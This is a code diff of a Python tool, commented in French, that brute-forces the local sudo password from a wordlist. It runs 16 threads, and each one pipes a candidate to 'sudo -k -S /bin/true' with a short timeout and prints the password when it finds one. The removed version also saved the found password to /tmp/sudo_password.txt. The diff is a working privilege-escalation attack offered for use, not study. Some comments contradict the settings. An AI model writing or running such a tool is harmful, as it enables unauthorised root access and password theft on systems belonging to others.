@@ -1,157 +1,97 @@
-import pexpect
+import subprocess
+import time
 import argparse
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
-import multiprocessing
-import threading
-import signal
 import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Variables globales pour le contrôle des threads
-password_found = threading.Event()
-found_password = None
-password_lock = threading.Lock()
-print_lock = threading.Lock()  # Lock pour l'affichage
-verbose_mode = False
-password_index = {}  # Pour suivre quels mots de passe ont été affichés
+# --- CONFIGURATION EXTRÊME ---
+# 32 workers permettent de saturer les 16 coeurs pendant les attentes I/O
+MAX_WORKERS = 16
+# Oracle abaissé à 0.07s car /bin/true répond beaucoup plus vite que whoami
+ORACLE_TIMEOUT = 0.080
+# ------------------------------
 
-def test_password(pw, index):
-    # Vérifier si un mot de passe a déjà été trouvé
-    if password_found.is_set():
-        return None
-
-    # Éviter les doublons d'affichage avec un lock
-    with print_lock:
-        if index not in password_index:
-            password_index[index] = True
-            if verbose_mode:
-                # Afficher en une seule ligne propre
-                print(f"[{index}] Test mot de passe: {pw}")
-    
-    child = None
-    
+def check_pw(pw):
+    """Test unitaire ultra-rapide via /bin/true"""
     try:
-        child = pexpect.spawn("sudo -S -k whoami", encoding="utf-8")
-        child.sendline(pw)
-        child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.1)
-        
-        if child.after == "root":
-            with password_lock:
-                # Double vérification pour éviter les races conditions
-                if not password_found.is_set():
-                    password_found.set()
-                    global found_password
-                    found_password = pw
-                    
-                    with print_lock:
-                        print(f"✅ Mot de passe trouvé : {pw} [{index}]")
-                        print("\033[91m🐚 VOUS ÊTES MAINTENANT ROOT !\033[0m")
-                        print("\033[92m🚀 Tapez simplement 'sudo su' !\033[0m")
-                    
-                    # Écrire le mot de passe dans un fichier pour le script bash
-                    try:
-                        with open("/tmp/sudo_password.txt", "w") as f:
-                            f.write(pw)
-                    except:
-                        pass
-                    
-                    # Arrêter tous les processus Python
-                    os.system("pkill -f python 2>/dev/null")
-                    return pw
-                    
-    except Exception as e:
-        # Ignorer les erreurs normales de timeout
+        # L'utilisation de 'true' évite de charger les libs de qui/id
+        # Redirection vers DEVNULL pour supprimer l'overhead de lecture stdout
+        proc = subprocess.Popen(
+            ["/usr/bin/sudo", "-k", "-S", "/bin/true"],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            text=True
+        )
+        try:
+            proc.communicate(input=f"{pw}\n", timeout=ORACLE_TIMEOUT)
+            if proc.returncode == 0:
+                return pw
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+    except Exception:
         pass
-    finally:
-        if child and child.isalive():
-            try:
-                child.close()
-            except:
-                pass
-    
     return None
 
-def signal_handler(sig, frame):
-    """Gérer l'arrêt propre avec Ctrl+C"""
-    print("\n⏹️  Arrêt demandé...")
-    password_found.set()
-    sys.exit(0)
-
 def main():
-    # Enregistrer le gestionnaire de signal pour Ctrl+C
-    signal.signal(signal.SIGINT, signal_handler)
-    
-    parser = argparse.ArgumentParser(description="Bruteforce sudo using a wordlist.")
-    parser.add_argument("--wordlist", required=True, help="Chemin vers le fichier wordlist")
-    parser.add_argument("--verbose", action="store_true", help="Afficher les tests en temps réel")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--wordlist", required=True)
     args = parser.parse_args()
 
-    # Définir le mode verbose global
-    global verbose_mode
-    verbose_mode = args.verbose
-
-    # Vérifier que le fichier existe
     if not os.path.exists(args.wordlist):
-        print(f"❌ Fichier {args.wordlist} non trouvé")
+        print(f"[-] Fichier {args.wordlist} introuvable.")
         return
 
-    try:
+    print(f"🚀 Bruteforce it !!! | Workers: {MAX_WORKERS} | Oracle: {ORACLE_TIMEOUT}s")
+    print("-" * 60)
+
+    attempts = 0
+    start_time = time.time()
+
+    # ThreadPoolExecutor gère le streaming sans "hang" entre les batches
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = {}
+        
         with open(args.wordlist, "r", encoding="latin-1", errors="ignore") as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    except Exception as e:
-        print(f"❌ Erreur lors de la lecture du fichier: {e}")
-        return
+            # Remplissage initial du pipeline
+            for _ in range(MAX_WORKERS):
+                line = f.readline()
+                if not line: break
+                pw = line.strip()
+                if pw:
+                    futures[executor.submit(check_pw, pw)] = pw
 
-    if not passwords:
-        print("❌ Aucun mot de passe dans le fichier wordlist")
-        return
-
-    if args.verbose:
-        print(f"🔍 Début du bruteforce avec {len(passwords)} mots de passe...")
-        print("💡 Appuyez sur Ctrl+C pour arrêter\n")
-        print("📋 Liste des mots de passe testés:")
-        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    else:
-        print(f"⏳ Test en cours ({len(passwords)} mots de passe)...")
-
-    max_workers = min(multiprocessing.cpu_count() * 2, 16)
-    success = False
-
-    try:
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            # Soumettre toutes les tâches
-            future_to_password = {
-                executor.submit(test_password, pw, i+1): (pw, i+1) 
-                for i, pw in enumerate(passwords)
-            }
-            
-            # Traiter les résultats au fur et à mesure
-            for future in as_completed(future_to_password):
-                if password_found.is_set():
-                    # Annuler les tâches restantes
-                    executor.shutdown(wait=False, cancel_futures=True)
-                    success = True
-                    break
+            # Boucle de streaming asynchrone
+            while futures:
+                # as_completed est la clé : on traite dès qu'un thread a fini
+                for future in as_completed(futures):
+                    pw_tested = futures.pop(future)
+                    attempts += 1
                     
-                result = future.result()
-                if result:
-                    success = True
-                    break
-                    
-    except KeyboardInterrupt:
-        if args.verbose:
-            print("\n⏹️  Arrêt demandé par l'utilisateur")
-        password_found.set()
-    except Exception as e:
-        print(f"❌ Erreur inattendue: {e}")
+                    # Succès ?
+                    result = future.result()
+                    if result:
+                        elapsed = time.time() - start_time
+                        print(f"\n\n✅ TROUVÉ : {result}")
+                        print(f"[*] Stats finales : {attempts} tests en {elapsed:.2f}s ({attempts/elapsed:.2f} mdp/s)")
+                        os._exit(0)
 
-    if not success:
-        print("❌ Aucun mot de passe trouvé.")
-        # Nettoyer le fichier temporaire si existant
-        try:
-            os.remove("/tmp/sudo_password.txt")
-        except:
-            pass
+                    # Affichage par modulo pour ne pas ralentir le CPU avec le terminal
+                    if attempts % 10 == 0:
+                        sys.stdout.write(f"\r[*] Tentatives : {attempts} | Speed: ~{int(attempts/(time.time()-start_time))} mdp/s | Test: {pw_tested[:12]:<12}")
+                        sys.stdout.flush()
+
+                    # Recharge immédiatement le pipeline
+                    next_line = f.readline()
+                    if next_line:
+                        next_pw = next_line.strip()
+                        if next_pw:
+                            futures[executor.submit(check_pw, next_pw)] = next_pw
+                    
+                    # On repasse au as_completed pour maintenir le flux tendu
+                    break
 
 if __name__ == "__main__":
     main()
